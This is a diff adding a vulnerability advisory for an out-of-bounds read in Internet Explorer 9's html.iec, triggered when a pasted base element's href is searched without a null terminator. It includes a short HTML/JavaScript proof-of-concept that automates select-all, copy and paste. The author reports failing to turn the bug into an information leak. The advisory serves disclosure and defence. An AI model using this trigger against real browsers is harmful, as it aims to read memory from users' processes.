@@ -1,0 +1,60 @@
+1505C - MSIE 9 html.iec PxchFindXch OOB read
+=====================================
+
+Synopsis
+--------
+Pasting RTF data may cause an out-of-bounds read in html.iec.
+
+Known affected software and attack vectors
+------------------------------------------
+  + Microsoft Internet Explorer 9
+
+    An attacker would need to get a target user to open a specially crafted
+    webpage, probably allow a pop-up to open and copy+paste data manually, or
+    allow programmatic clipboard access.
+    Disabling JavaScript should prevent an attacker from exploiting the issue.
+    A pop-up blocker may be able to prevent an attacker from triggering the
+    vulnerable code path. Disallowing programmatic clipboard access prevents an
+    attacker from automating parts of the attack.
+
+Repro
+-----
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <script>
+      var oWindow = window.open("target.xhtml");
+      (function () {
+        if (oWindow.document.getElementsByTagName("base").length) {
+          oWindow.document.execCommand("SelectAll");
+          oWindow.document.execCommand("Copy");
+          oWindow.document.execCommand("Paste");
+        } else {
+          setTimeout(arguments.callee);
+        };
+      })();
+    </script>
+  </head>
+</html>
+
+target.xhtml:
+<base href="x">
+
+Description
+-----------
+When copying HTML to the clipboard, it is apparently converted to RTF. When
+pasting from the clipboard, the RTF is converted back to HTML. If the RTF/HTML
+contains a "base" element with a "href" attribute, the code looks for a double
+quote (") char in the string value of the "href" attribute using the PxchFindXch
+function in html.iec. This function expects to be searching a NULL terminated
+Unicode string, but the string provided is not NULL terminated. This causes the
+code to read beyond the end of the string.
+
+Exploit
+-------
+I've attempted to exploit the issue by changing the designMode property of the
+document before pasting, but was unable to add the "base" element to a document
+in order to read the "href" property and disclose out-of-bounds information.
+I'm not sure why pasting does not appear to work as expected and did not
+investigate further.
